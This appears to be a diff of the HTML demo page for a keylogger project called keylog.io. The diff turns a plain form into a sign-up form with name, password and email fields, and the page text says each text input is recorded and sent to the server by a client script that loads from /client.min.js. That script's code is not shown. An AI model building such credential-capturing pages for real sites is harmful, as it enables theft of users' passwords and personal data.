@@ -1,65 +1,81 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8">
-    <title>Keylogger Client Demo</title>
-    <style>
-      .demo-form {
-        max-width: 600px;
-        margin: 100px auto;
-      }
-      input[type=text],
-      textarea,
-      select {
-        width: 100%;
-        padding: 12px 20px;
-        margin: 8px 0;
-        display: inline-block;
-        border: 1px solid #ccc;
-        border-radius: 4px;
-        box-sizing: border-box;
-      }
-      input[type=submit] {
-        width: 100%;
-        background-color: #4CAF50;
-        color: white;
-        padding: 14px 20px;
-        margin: 8px 0;
-        border: none;
-        border-radius: 4px;
-        cursor: pointer;
-      }
-      input[type=submit]:hover {
-        background-color: #45a049;
-      }
-      div {
-        border-radius: 5px;
-        background-color: #f2f2f2;
-        padding: 20px;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="demo-form">
-      <h1>Keylogger Client Demo</h1>
-      <p>
-        This page has the <b>keylogger-client</b> enabled, each keyboard character <br>
-        you press, even if it's not inside an input, it will be catched and sent <br>
-        to the keylog.io endpoint, stored and processed through the interface.
-      </p>
-      <form>
-        <label for="fname">First Name</label>
-        <input type="text" name="firstname" placeholder="Your name..">
 
-        <label for="lname">Last Name</label>
-        <input type="text" name="lastname" placeholder="Your last name..">
+<head>
+  <meta charset="utf-8">
+  <title>Keylogger Client Demo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    .form {
+      position: relative;
+      z-index: 1;
+      background: #FFFFFF;
+      max-width: 360px;
+      margin: 100px auto 100px;
+      padding: 45px;
+      box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
+    }
 
-        <label for="country">Description</label>
-        <textarea name="description" rows="8" cols="80"></textarea>
+    .form input {
+      font-family: "Roboto", sans-serif;
+      outline: 0;
+      background: #f2f2f2;
+      width: 100%;
+      border: 0;
+      margin: 0 0 15px;
+      padding: 15px;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
 
-        <input type="submit" value="Submit">
-      </form>
-    </div>
-  </body>
-  <script type="text/javascript" src="/client.min.js"></script>
+    .form button {
+      font-family: "Roboto", sans-serif;
+      text-transform: uppercase;
+      outline: 0;
+      background: #4CAF50;
+      width: 100%;
+      border: 0;
+      padding: 15px;
+      color: #FFFFFF;
+      font-size: 14px;
+      -webkit-transition: all 0.3 ease;
+      transition: all 0.3 ease;
+      cursor: pointer;
+    }
+
+    .form button:hover,
+    .form button:active,
+    .form button:focus {
+      background: #43A047;
+    }
+
+    .form .message {
+      margin: 15px 0 0;
+      color: #b3b3b3;
+      font-size: 12px;
+    }
+
+    .form .message a {
+      color: #4CAF50;
+      text-decoration: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="form">
+    <h1>Keylog.io Demo</h1>
+    <p>
+      This page has <b>keylog.io-client</b> payload, each text input will be recorded and sent to the server.
+    </p>
+    <form>
+      <input type="text" placeholder="name" />
+      <input type="password" placeholder="password" />
+      <input type="text" placeholder="email address" />
+      <button>SIGN UP</button>
+    </form>
+  </div>
+</body>
+<script type="text/javascript" src="/client.min.js"></script>
+
 </html>
